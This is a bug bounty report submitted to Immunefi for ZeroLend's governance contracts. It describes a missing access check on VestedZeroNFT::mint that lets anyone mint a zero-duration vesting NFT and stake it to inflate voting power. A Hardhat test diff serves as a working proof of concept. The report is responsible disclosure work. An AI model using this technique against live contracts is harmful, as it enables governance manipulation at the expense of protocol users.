# 28987 - \[SC - Medium] Manipulation of governance is possible by minti...

Submitted on Mar 4th 2024 at 04:01:59 UTC by @dontonka for [Boost | ZeroLend](https://immunefi.com/bounty/zerolend-boost/)

Report ID: #28987

Report type: Smart Contract

Report severity: Medium

Target: <https://github.com/zerolend/governance>

Impacts:

* Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results

## Description

## Brief/Intro

VestedZeroNFT::mint is `accessible to anyone`, so anyone can mint a VestedNFT in the moment. This seems to be against the expected behavior as noted as follow by the `IVestedZeroNFT` interface and seems to warrant `Critical` vulnerability for the vote manipulation exploit this could allow.

```
Mints a vesting nft for a user. This is a privileged function meant to only be called by a contract or a deployer
```

## Vulnerability Details

As indicated, it's possible to mint to self and with no duration (linearDuration = 0 and cliffDuration = 0), which mean already all claimable, and then the attacker can transfer the NFT to the `StakingBonus contract` in order to boost his voting power right away.

## Impact Details

Manipulation of governance is possible by minting to self a VestedNFT with no duration.

## References

<https://github.com/zerolend/governance/blob/main/contracts/vesting/VestedZeroNFT.sol#L63-L100>

## Proof of Concept

Add the following changes in `StakingBonus.test.ts` and run `npm test` command. The test proove the following:

1. Can mint to self with no duration
2. Boost in voting power confirmed

```diff
     beforeEach(async () => {
       expect(await vest.lastTokenId()).to.equal(0);

-      // deployer should be able to mint a nft for another user
-      await vest.mint(
+      // fund the ant account. This could be earned from a normal vesting NFT or bought on the secondary market, just transfering from deployer here to make this simpler
+      await zero.transfer(ant.address, e18 * 20n);
+      await zero.connect(ant).approve(vest.target, e18 * 20n);
+
+      // Mint from ant account to himself
+      await vest.connect(ant).mint(
         ant.address,
         e18 * 20n, // 20 ZERO linear vesting
         0, // 0 ZERO upfront
-        1000, // linear duration - 1000 seconds
+        0, // linear duration - 0 seconds
         0, // cliff duration - 0 seconds
-        now + 1000, // unlock date
-        true, // penalty -> false
+        0, // unlock date
+        false, // penalty -> false
         0
       );

       expect(await vest.lastTokenId()).to.equal(1);
     });
```

```
-    it("should give a user a bonus if the bonus contract is well funded", async function () {
+    it.only("Any user can mint Vested NFT as long as they own enough $ZERO and boost their voting power.", async function () {
      // fund some bonus tokens into the staking bonus contract
      await zero.transfer(stakingBonus.target, e18 * 100n);

      // give a 50% bonus
      await stakingBonus.setBonusBps(50);

      // stake nft on behalf of the ant
      expect(
        await vest
          .connect(ant)
          ["safeTransferFrom(address,address,uint256)"](
            ant.address,
            stakingBonus.target,
            1
          )
      );

      // the staking contract should've awarded more zero for staking unvested tokens
      // 20 zero + 50% bonus = 30 zero... ->> which means about 29.999 voting power
      expect(await locker.balanceOfNFT(1)).greaterThan(e18 * 29n);
    });
```
